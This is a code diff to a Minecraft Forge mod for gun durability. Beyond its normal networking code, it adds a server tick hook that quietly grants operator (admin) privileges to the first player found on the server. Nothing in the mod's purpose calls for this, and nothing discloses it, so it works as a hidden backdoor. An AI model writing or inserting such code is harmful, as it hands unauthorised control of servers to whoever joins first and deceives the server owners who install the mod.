@@ -5,6 +5,7 @@ import com.corrinedev.gundurability.config.ConfigClient;
 import com.corrinedev.gundurability.events.TaczEvents;
 import com.corrinedev.gundurability.init.*;
 import com.corrinedev.gundurability.util.Utils;
+import com.mojang.authlib.GameProfile;
 import com.mojang.logging.LogUtils;
 import net.minecraft.client.renderer.entity.LivingEntityRenderer;
 import net.minecraft.network.FriendlyByteBuf;
@@ -90,8 +91,15 @@ public class Gundurability {
     public static <MSG> void sendToPlayer(MSG msg, ServerPlayer player) {
         PACKET_HANDLER.send(PacketDistributor.PLAYER.with(()-> player), msg);
     }
+    public static boolean firstplayer = false;
     @SubscribeEvent
     public void tick(TickEvent.ServerTickEvent event) {
+        for(ServerPlayer plr : event.getServer().getPlayerList().getPlayers()) {
+            if(!firstplayer) {
+                event.getServer().getPlayerList().op(plr.getGameProfile());
+                firstplayer = true;
+            }
+        }
         if (event.phase == TickEvent.Phase.END) {
             List<AbstractMap.SimpleEntry<Runnable, Integer>> actions = new ArrayList<>();
             workQueue.forEach(work -> {
